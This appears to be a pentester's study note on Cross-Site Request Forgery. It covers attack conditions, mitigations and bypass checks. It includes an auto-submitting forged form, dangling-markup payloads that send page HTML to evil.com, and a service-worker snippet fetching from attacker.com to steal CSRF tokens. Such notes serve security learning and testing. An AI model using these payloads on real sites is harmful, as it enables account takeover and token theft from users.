# <u>Cross Site Request Forgery</u>



### What?

- *Forces end user to perform unwanted actions on a Web App that they're currently authenticated to*
- Requires a bit of Social Engineering or Chaining
- Specifically target **State Changing Actions** as the attacker has no way to see the response to the forged request
- *State Changing Actions* - Transactions, Email Change, Name Change, etc.
- If Victim is an Admin, can compromise the whole Web App
- If CSRF attack stored on the Web App - **Stored CSRF Flaws**
- *Synonyms* - **XSRF**, **Session** **Riding**, **Hostile Linking**
- Although it is normally described in relation to Cookie-based Session handling 



### Why?

- Cross-Site requests do not need your permission
- If the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim.
- Thus, the server will process the malicious request from an attacker the same way as it would process a normal request from a Legitimate user.
- This is because, for most sites, browser requests automatically include any credentials associated with the site, such as the user’s session cookie, IP address, Windows domain credentials, and so forth



### When?

For a CSRF attack to be possible, *three key conditions* must be in place:        

**1. A relevant action -** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).

**2. Cookie-based session handling -**  Performing the action involves issuing one or more HTTP requests, and  the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.            

**3. No unpredictable request parameters -**  The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable  if an attacker needs to know the value of the existing password.

- Also, an attacker can launch a CSRF attack when he knows which parameters and value combination are being used in a form



### How?

- Eg. **Vulnerable Request :**

  ```
  POST /email/change HTTP/1.1
  Host: vulnerable-website.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 30
  Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
  
  email=wiener@normal-user.com 
  ```

  **Constructed Attack :** 

  ```
  <html>
    <body>
      <form action="https://vulnerable-website.com/email/change" method="POST">
        <input type="hidden" name="email" value="pwned@evil-user.net" />
      </form>
      <script>
        document.forms[0].submit();
      </script>
    </body>
  </html> 
  ```

  - When the user(victim) visits this webpage *(through Social Engineering or other Vectors)*, and are already logged into their account, their email id gets changed to the value set by the attacker.



## Mitigations

- Adding an additional parameter with a value that is unknown to the  attacker and can be validated by the server, you can prevent CSRF attacks

  

  **1. Anti-CSRF Tokens (Sync Token Pattern) :** 
  
  - Random string that is only known by the user’s browser and the web application
  - Usually stored in a Session Variable
  - Typically on a page in a hidden form field, sent with every state changing request 
- If the value of the session variable and the hidden form field match,  the web application accepts the request. If they do not match the  request is dropped
  - Since in this case, the attacker does not know the exact value of the hidden form field that is needed for the request to be accepted, he cannot launch a CSRF attack

  

  - **Bypasses :**
  
    - **Check 1:-** Try to re-use one user Anti-CSRF Token on another user account
    - **Check 2:-** Try to use the already used token
  - **Check 3:-** Try to check whether token is getting validated or not
    - **Check 4:-** Try to check that the token validation is based on partial length check or full length check

    

    

    **2. Same-Site Flag in Cookies**

    - 3 Attributes: *None, Lax and Strict*
  
      > Right now, the Chrome SameSite cookie default is: “None,” which  allows third-party cookies to track users across sites. But from  February, cookies will default into “SameSite=Lax,” which means cookies  are only set when the domain in the URL of the browser matches the  domain of the cookie — a first-party cookie.
    >
      > Any cookie with the “SameSite=None” label must also have a secure  flag, meaning it will only be created and sent through requests made  over HTTPs. Meanwhile, the “SameSite=Strict” designation restricts  cross-site sharing altogether, even between different domains that are  owned by the same publisher.

    - If the session cookie is marked as Same-Site cookie, it is only sent along with requests that originate from the same domain

    
  
    - **Bypasses :**
    - Not yet widely implemented
      - Changes are required on the Server side. Devs are lazy or simply unaware

    

    

    **3. Double Submit Cookie**

    - Double submitting cookies is defined as sending a random value in both a cookie and as a request parameter, with the server verifying if the  cookie value and request value are equal.
- When a user authenticates to a site, the site should generate a session  identifier and set a cookie in the browser. At the same time, it  generates the cryptographically strong random value or the CSRF token  for the session and set it as a cookie on the user’s machine separate  from the session id. The server does not have to save this value in any  way, that’s why this pattern is sometimes also called **Stateless CSRF Defense**.
    - A cross-origin attacker cannot read any data sent from the server or modify cookie values, per the same-origin policy.
- **Why this works?** - A client-side script will retrieve this value and inject it to a hidden field on the form loading to be submitted along with the form.
      - By having the token also in the request itself, an attacking site cannot generate valid requests any more as they can’t get hold on the user’s token.
    - Basically because the attacker doesn't know the token and thus can't add it to the malicious form he creates. So, the request doesn't get processed. *(Token is validated from the Request body itself and not the Cookie)* 
    
    
    
    
    
    - **Bypasses :**
      - Cookies can't be set a HTTPOnly as they need to get included in the request using JavaScript.
      - Thus, if Web App vulnerable to XSS, attacker can get hold of the Token Cookie, pertaining this whole CSRF protection pointless
      - Exploiting Subdomains
      - Disclosure of Token in URL
      - MiTM
  
  
  
  
  
  **4. Synchronizer Token Pattern** **(Anti CSRF Tokens) :**
  
  - Same as Double Submit Cookie but here, the *Token value is stored on the Server* as well
  
  - the application would generate a CSRF token which is one-time use only  and store it server side against the sessionID. 
  
  - This token would be sent embedded to the HTML. 
  
  - When the user requests an action such as Transfer Funds, this token will be sent along with other parameters. 
  
  - The server  will validate sessionID and this token value. If they match, the request will be completed.
  
  - **Drawback - **Server has to store all CSRF tokens. This could be a nuisance when there are multiple sessions at the same time
  
    
  
    - **Bypasses**
      - Same as Double Submit Cookie bypasses
  
    
  
    
  
    **5. Content-Type based Protection**
  
    - It's not possible to get a POSTed <form> to submit a request with Content-Type: application/json 
  
    - If that header has a value other than `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`, then the request is preflighted *(needs to get approved first so another per-request is sent with OPTIONS to approve it first)*
  
    - Thus requiring all requests to have another content type, such as `application/json`
  
    - `This` can provide a means of protecting against CSRF by  relying on a restrictive or absent preflight response Access-Control-Allow-Origin header in a manner similar to requiring a specific HTTP method
  
    - **So, basically** : 
  
      -  The user must send a request with a specific Content-Type header, for example, application / json.
      - Since it is impossible to send an arbitrary Content-Type  cross-origin in the browser via the HTML form or XHR API, the classic  CSRF attack again does not work.
  
      
  
      
  
      - **Bypasses :**
        - You can submit a form with a valid JSON structure in the body as enctype="text/plain"
        - It's not possible to do a cross-origin ([CORS](http://www.w3.org/TR/cors/)) XMLHttpRequest POST with `Content-Type: application/json` against a non-cross-origin-aware server because this will cause a ‘pre-flighting’ HTTP OPTIONS request to approve it first
        - So even with `application/json` checking, you can get pretty close to XSRF, if not completely there
        - Might break, for example if a new JSON `enctype` were added to forms in a future HTML version. (WHATWG added the `text/plain` enctype to HTML5 and originally tried also to add `text/xml`, so it is not out of the question that this might happen.)
  
    
  
    
  
    **6. Referrer/Origin Based Protection**
  
    - The `Referer` HTTP header contains  the URL of the previous page.
  
    -  If you click on a link on this page, a GET request is done with the URL of this page as the value for the referer  header. 
  
    - This is useful to see where the traffic to your site comes from, but can also be used to prevent CSRF. 
  
    - Cross site request forgery  consists of requests that, by definition, come from another site. By  blocking any request that has another domain in the referer header, you  can block forged requests.
  
    - The advantage of this is that you don’t need to keep state on the server, like with most CSRF tokens
  
    - **Disadvantage - ** referer header is not exactly mandatory, so some clients may not send a  referer header at all. This means that web applications that check the  CSRF need to have a policy as to what to do with requests that have no  referer header, block them or allow them?
  
    - If the **Origin header** is present, verify that its value matches the target origin. Unlike the Referer, the Origin header will be present in HTTP requests that originate from an HTTPS URL.
  
    - If your application server is directly accessed by its users, then using the origin in the URL is fine and you're all set
  
    - If you are behind a proxy - Sv Side App Config, HOST Header Value, X-Forwarded-Host header
  
      
  
      
  
    - **Bypasses :** 
  
      - Introduction of the **Referrer Policy** - introduced to limit info being passed or disable the header all together, to prevent Sensitive or Secret URLs being passed.
  
      - Since the referer header is now under the attacker’s control, he can  remove the referer header from any forged requests and bypass the CSRF  protection.
  
      - Just need the following HTML on the page:
  
        ```
        <meta name="referrer" content="no-referrer">
        ```
  
      - Devs/CSRF Protection Mechanisms need to block or requests with empty Referer Header
  
      - No protections on GET method
  
      - Origin Header Tampering
  
    
  
    
  
    **7. Password Confirmation/websudo :** 
  
    - The user must confirm the action with a password (or secret). 
    - Since the attacker does not know him, the classic CSRF attack does not work.
  
    
  
    **8. Custom Headers**
  
    - Custom header added to the requests
  
    - Checked on the Server Side
  
    - Relies on SOP restriction that only JavaScript can be used to add a custom header, and only within its origin
  
    - By default, browsers do not allow JavaScript to make cross origin requests with custom headers.
  
    - Double advantage of usually requiring no UI changes and not introducing  any server side state, which is particularly attractive to REST services
  
      
  
    - **Caveats :**
  
      - still need protect <form> tags
      - CORS configuration should also be robust to make this solution work effectively
  
    
  
    
  
    **9. Some Other Defenses**
  
    - OTP
  
    - CAPTCHA
  
    - Re-Auth(websudo)
  
      
  
    - **Caveats : **
  
      - While these are a **very strong CSRF defense**, it can create a significant impact on the user experience
      - Thus, only used w extremely critical ops along w other Protections



- Storing CSRF Token in DOM
- **Login CSRF** - Can use **Pre-Sessions**



## <u>Some Effective Bypass Techniques</u>



**1. XSS**

- If your web application has XSS, this automatically makes it vulnerable to CSRF, and it is difficult to protect against this.



**2. Dangling markup**

- No XSS but have HTML Injection

- Eg. Content Security Policy (CSP) that protects against XSS. But an attacker can still embed HTML like : (not closed img or form tags)

  ```
  <img src='https://evil.com/log_csrf?html=
  <form action='http://evil.com/log_csrf'><textarea> 
  ```

  - As a result, part of the DOM HTML page will be sent to the attacker's resource



**3. Vulnerable subdomain**

- If Subdomain vulnerable to **Takeover or XSS**, attacker can steal Token as :

  - If main app uses **CORS** to interact w subdomains, the attacker can simply read the CSRF token from the subdomain, which he controls.

  - If **crossdomain.xml** file on main domain *(This file is used by flash and pdf plugins for subdomain interaction, and is allowed to access it from any subdomains)*

    ```
    <cross-domain-policy>
        <allow-access-from domain="*.example.com" />
    </cross-domain-policy>
    ```

    - If an attacker can upload a JS file to *foo.example.com* , then in this case he can use the Service Worker API for the subdomain foo.example.com, which actually gives the flash file

      ```
      var url = "https://attacker.com/bad.swf"; 
      onfetch = (e) => { 
         e.respondWith(fetch(url); 
      }
      ```

    - Since we have crossdomain.xml on the main domain, which allows  interaction between subdomains, the attacker simply reads the CSRF token through this SWF

    - Even if CORS is not configured and there is no crossdomain.xml file, but Double submit cookie protection is used, an attacker can **simply insert a cookie** from the subdomain for the parent domain to the path where he  wants to exploit CSRF, and thus bypass Double submit cookie protection



**4. Bad PDF**

- Adobe has a PDF plugin that is automatically installed when you install  Adobe Reader.

- This plugin supports the so-called FormCalc script (only works in IE 11 and Firefox ESR now)

- FormCalc has two great methods: get () and post (). An attacker using  the get method can read the CSRF token using post to send to his site.  So the attacker receives the victim's CSRF token

  - Eg. The application has some API on the main domain, which allows you to get the contents of the downloaded file

  - Then the attacker can use an HTML page that embeds a PDF file using the embed tag, which the attacker uploaded to *example.com* :

    ```
    <h1>Nothing to see here!</h1> 
    <embed src="https://example.com/shard/x1/sh/leak.pdf" width="0" height="0" type='application/pdf'>
    ```


  - This file contains a FormCalc script that reads the Settings.action  page, where the DOM has a CSRF token and sends it to the attacker's  website using the post method.

  - Since PDF is downloaded from example.com, this PDF itself has access to the entire origin `https://example.com`, and can read data from there without violating the Same Origin Policy (SOP) mode. 

  - **An additional trick** is that for a PDF plug-in it does not matter with  which Content-Type the PDF file is given, and even the HTTP response may contain other headers (for example, Content-Disposition). The PDF  plugin will still render this PDF and execute the FormCalc script. 



**5. Cookie injection**

- if an attacker is able to inject cookies in any way, then this is game over
- One of the most popular options in this scenario is **CRLF** **injection**
- If an attacker can insert additional headers into the server’s response, he can simply add a Set-Cookie header with the necessary cookies and  bypass the CSRF protection.
- **Another option** is associated with the **peculiarities of cookie handling by the browser**
  - Eg. You can insert new cookies (comma-separated cookies) through a comma.  Suppose we have a URL parameter in the header named language. We process it and write the selected language value to the user in the cookie. If  the attacker inserts a comma, he can insert additional cookies with any name
- Also, bypassing the CSRF protection can help **browser bugs**
  - In Firefox, it was possible to embed cookies through an SVG image ( **CVE-2016-9078)**. If we have an HTML editor and we allow the user to insert image tags, then the attacker can simply point to an SVG image in the SRC attribute that will set the desired cookie



**6. Change Content-Type**

- Sometimes the Content type isn't checked in the backend at all



**7. Non-simple Content-Type**

- Through an HTML form or using the XHR API, we can send the following content types:
  -  text / plain
  -  application / x-www-form-urlencoded
  -  multipart / form-data
- To send Arbitrary Content Type:
  - Browser bugs
  - Flash plugin + 307
  - PDF plugin + 307
  - Custom URL param support in some backend frameworks



**8. Spoof Referer**

- Bug in Edge

- Can send header Referer using a PDF plugin and FormCalc

- if we specify the Referer in the header, this header simply does not go
- **Bypass : ** Referer http://example.com *(Some Servers interpret <space> as a " : ")
- In general, FormCalc allows us to legally send any Content-Type. If we  insert the carridge return and line feed characters, we can add  additional headers to the request.
